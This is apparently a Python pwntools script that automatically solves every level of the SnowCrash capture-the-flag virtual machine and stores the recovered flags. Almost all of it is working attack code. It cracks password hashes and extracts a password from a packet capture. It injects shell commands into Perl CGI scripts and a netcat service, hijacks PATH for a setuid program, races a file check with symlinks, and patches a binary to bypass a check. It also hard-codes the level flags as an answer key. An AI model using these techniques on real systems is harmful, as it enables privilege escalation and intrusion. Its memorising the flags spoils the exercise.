#!/usr/bin/env python2
import re
import sys
import ctypes
from pwn import *

flag_reg = re.compile("\w{25}")
flags = []
ref_flags = [
    "x24ti5gi3x0ol2eh4esiuxias",
    "f2av5il02puano7naaf6adaaf",
    "kooda2puivaav1idi4f57q8iq",
    "qi0maab88jeaj46qoumi7maus",
    "ne2searoevaevoem4ov4ar8ap",
    "viuaaale9huek52boumoomioc",
    "wiok45aaoguiboiki2tuin6ub",
    "fiumuikeil55xe9cu4dood66h",
    "25749xKZ8L7DkSCwJkT9dyv6f",
    "s5cAJpM8ev6XHw998pRWG728z",
    "feulo4b72j7edeahuete3no7c",
    "fa6v5ateaw21peobuub8ipe6s",
    "g1qKMiRpXf53AWhDaU7FEkczr",
    "2A31L79asukciNyi8uppkEuSx",
    "7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ",
]
rhost = "192.168.56.104"
rport = 4242
levels = []


def rot_alpha(n):
    from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans

    lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
    return lambda s: s.translate(lookup)


def get_flag_as_user(shell, usr, passwd):
    sh = shell.run("su " + usr)
    sh.sendlineafter("Password: ", passwd)
    sh.sendlineafter(usr + "@SnowCrash:~$ ", "getflag")
    ret = flag_reg.search(sh.recvline(keepends=False)).group(0)
    sh.close()
    return ret


# level00
def level00():
    shell = ssh("level00", rhost, password="level00", port=rport)
    johnpath = shell["find / -user flag00 2>/dev/null"].splitlines()[0]
    john = shell["cat " + johnpath]
    print john
    john = rot_alpha(11)(john)
    print john
    flags.append(get_flag_as_user(shell, "flag00", john))
    shell["exit"]
    shell.close()


# level01
def level01():
    shell = ssh("level01", rhost, password=flags[0], port=rport)
    shell["grep 'flag01' /etc/passwd > /tmp/pass"]
    shell.download_file("/tmp/pass")
    passwd = re.search(
        "flag01:(\w*):3001", process(["john", "--show", "pass"]).recvall()
    ).group(1)
    flags.append(get_flag_as_user(shell, "flag01", passwd))
    shell["exit"]
    shell.close()


# level02
def level02():
    shell = ssh("level02", rhost, password=flags[1], port=rport)
    shell.download_file("level02.pcap")
    # tshark -z follow,tcp,raw,0,30-50 -r level02.pcap 2>/dev/null | awk '$0 ~ /^[0-9a-f]$/ { print $1 }'
    tshk = process(["tshark", "-z", "follow,tcp,raw,0,30-50", "-r", "level02.pcap"])
    awk = process(["awk", "$0 ~ /^[0-9a-f]{2}$/ { print $1 }"])
    tshk.connect_output(awk)
    pckts = [i for i in awk.recvall().split("\n")][:-1]
    tshk.close()
    awk.close()
    while "7f" in pckts:
        i = pckts.index("7f")
        pckts.pop(i)
        pckts.pop(i - 1)
    passwd = ""
    for i in [chr(int(j, 16)) for j in pckts[:-1]]:
        passwd += i
    print "flag02 login:" + passwd
    flags.append(get_flag_as_user(shell, "flag02", passwd))
    shell["exit"]
    shell.close()


# level03
def level03():
    shell = ssh("level03", rhost, password=flags[2], port=rport)
    shell["ln -s /bin/getflag /tmp/echo"]
    flap = flag_reg.search(shell["env PATH=/tmp:$PATH ./level03"]).group(0)
    print "levle03 flag: " + flap
    flags.append(flap)
    shell["exit"]
    shell.close()


# level04
def level04():
    req = process(
        [
            "http",
            "--pretty",
            "none",
            "--ignore-stdin",
            "-b",
            "-f",
            "192.168.56.104:4747/level04.pl",
            "x=;getflag",
        ]
    )
    flags.append(flag_reg.search(req.recvall()).group(0))
    print "level04 flag: " + flags[3]


# level05
def level05():
    shell = ssh("level05", rhost, password=flags[4], port=rport)
    res = shell[
        "rm -f /tmp/flag; printf '#!/bin/bash\ngetflag>/tmp/flag\n' >/opt/openarenaserver/snjort;"
        "chmod +x /opt/openarenaserver/snjort;"
        "while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done"
    ]
    flags.append(flag_reg.search(res).group(0))
    print "level05 flag: " + flags[5]
    shell.close()


# level06
def level06():
    shell = ssh("level06", rhost, password=flags[5], port=rport)
    res = shell[
        "echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"
    ]
    flags.append(flag_reg.search(res).group(0))
    print "level06 flag: " + flags[6]
    shell["exit"]
    shell.close()


# level07
def level07():
    shell = ssh("level07", rhost, password=flags[6], port=rport)
    res = shell["env LOGNAME=\;getflag ./level07"]
    flags.append(flag_reg.search(res).group(0))
    print "level07 flag: " + flags[7]
    shell["exit"]
    shell.close()


# level08
def level08():
    shell = ssh("level08", rhost, password=flags[7], port=rport)
    passwd = shell["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
    print "flag08 login: " + passwd
    flags.append(get_flag_as_user(shell, "flag08", passwd))
    print "level08 flag: " + flags[8]
    shell["exit"]
    shell.close()


# level09
def level09():
    shell = ssh("level09", rhost, password=flags[8], port=rport)
    token = shell.download_data("token")
    passwd = ""
    for i in xrange(len(token) - 1):
        passwd += chr(ord(token[i]) - i)
    print "flag09 login: " + passwd
    flags.append(get_flag_as_user(shell, "flag09", passwd))
    print "level09 flag: " + flags[9]
    shell["exit"]
    shell.close()


# level10
def level10():
    shell = ssh("level10", rhost, password=flags[9], port=rport)
    m = None
    script = "#!/bin/bash\n pkill nc\n echo ''>/tmp/flog\n touch /tmp/l10\n while [ -z $(egrep '\\w{25}' /tmp/flog) ]; do\n nc -l 6969 | tee -a /tmp/flog &\n ln -sf /tmp/l10 /tmp/a &\n ./level10 /tmp/a 127.0.0.1 &\n ln -sf ~/token /tmp/a &\ndone\n"
    shell[
        "rm -f /tmp/flag; printf '" + script + "'>/tmp/honk.sh;" "chmod +x /tmp/honk.sh"
    ]
    p = shell.process("/tmp/honk.sh")
    while m is None:
        res = p.recv()
        m = flag_reg.search(res)
    passwd = m.group(0)
    print "flag10 login: " + passwd
    flags.append(get_flag_as_user(shell, "flag10", passwd))
    print "level10 flag: " + flags[10]
    shell["exit"]
    shell.close()


# level11
def level11():
    shell = ssh("level11", rhost, password=flags[10], port=rport)
    p = shell.process(["nc", "localhost", "5151"])
    p.sendlineafter("Password: ", ":;getflag>/tmp/flag11")
    p.close()
    res = shell["cat /tmp/flag11"]
    flags.append(flag_reg.search(res).group(0))
    print "level11 flag: " + flags[11]
    shell["exit"]
    shell.close()


# level12
# yaboi perl script not sanitizing inputs
def level12():
    shell = ssh("level12", rhost, password=flags[11], port=rport)
    shell[
        "printf '#!/bin/bash\ngetflag>/tmp/glag\n'>/tmp/GONK; chmod +x /tmp/GONK; curl localhost:4646/level12.pl?x=\`/*/gonk\`"
    ]
    res = shell["cat /tmp/glag"]
    flags.append(flag_reg.search(res).group(0))
    print "level12 flag: " + flags[12]
    shell["exit"]
    shell.close()


# level13
# patching bytes my scungle
def level13():
    shell = ssh("level13", rhost, password=flags[12], port=rport)
    res = shell[
        "xxd level13>/tmp/level13;printf '90c\n0000590: e4f0 83ec 10e8 e6fd ffff 3ddd 0700 0074  ..........=....t\n.\nw\nq\n'|ed /tmp/level13;xxd -r /tmp/level13>/tmp/goat;chmod +x /tmp/goat;/tmp/goat"
    ]
    flags.append(flag_reg.search(res).group(0))
    print "level13 flag: " + flags[13]
    shell["exit"]
    shell.close()


# level14
def level14():
    shell = ssh("level14", rhost, password=flags[13], port=rport)
    token = shell["strings /bin/getflag | egrep '^[[:print:]]{39}$'"]
    ft_des = """#include <string.h>
#include <stdio.h>
char * ft_des(const char *param_1){
        const char *s="0123456";
	char cc;
	char *ret;
	unsigned int max;
	char *tmp;
	unsigned char bVar5;
	unsigned int total;
	int ii;
	int jj;
	int ll;
	bVar5 = 0;
	ret = strdup(param_1);
	ii = 0;
	total = 0;
	do {
		max = 0xffffffff;
		tmp = ret;
		do {
			if (max == 0)
				break;
			max = max - 1;
			cc = *tmp;
			tmp = tmp + (unsigned int)bVar5 * -2 + 1;
		} while (cc);
		if (~max - 1 <= total) {
			return ret;
		}
		if (ii == 6) {
			ii = 0;
		}
		if ((total & 1) == 0) {
			if ((total & 1) == 0) {
				ll = 0;
				while (ll < (int)s[ii]) {
					ret[total] = ret[total] + -1;
					if (ret[total] == 0x1f) {
						ret[total] = '~';
					}
					ll = ll + 1;
				}
			}
		}
		else {
			jj = 0;
			while (jj < (int)s[ii]) {
				ret[total] = ret[total] + 1;
				if (ret[total] == 0x7f) {
					ret[total] = ' ';
				}
				jj = jj + 1;
			}
		}
		total = total + 1;
		ii = ii + 1;
	} while(1);
}
int main(int c, char **v) {
    (void)c;
    puts(ft_des(v[1]));
}
"""
    shell.upload_data(ft_des, "/tmp/butts.c")
    res = shell["cd /tmp; cc butts.c; /tmp/a.out '" + token + "'"]
    print res
    passwd = re.search("[\S ]{39}", res).group(0)
    print passwd
    flags.append(get_flag_as_user(shell, "flag14", passwd))
    print "level14 flag: " + flags[14]
    shell["exit"]
    shell.close()


if __name__ == "__main__":
    tmp = -1
    if len(sys.argv) > 1:
        tmp = int(sys.argv[1])
        flags = ref_flags[:tmp]
    if tmp < 0:
        level00()
        level01()
        level02()
        level03()
        level04()
        level05()
        level06()
        level07()
        level08()
        level09()
        level10()
        level11()
        level12()
        level13()
        level14()
    else:
        if tmp == 0:
            level00()
        if tmp == 1:
            level01()
        if tmp == 2:
            level02()
        if tmp == 3:
            level03()
        if tmp == 4:
            level04()
        if tmp == 5:
            level05()
        if tmp == 6:
            level06()
        if tmp == 7:
            level07()
        if tmp == 8:
            level08()
        if tmp == 9:
            level09()
        if tmp == 10:
            level10()
        if tmp == 11:
            level11()
        if tmp == 12:
            level12()
        if tmp == 13:
            level13()
        if tmp == 14:
            level14()
    # done
    print flags
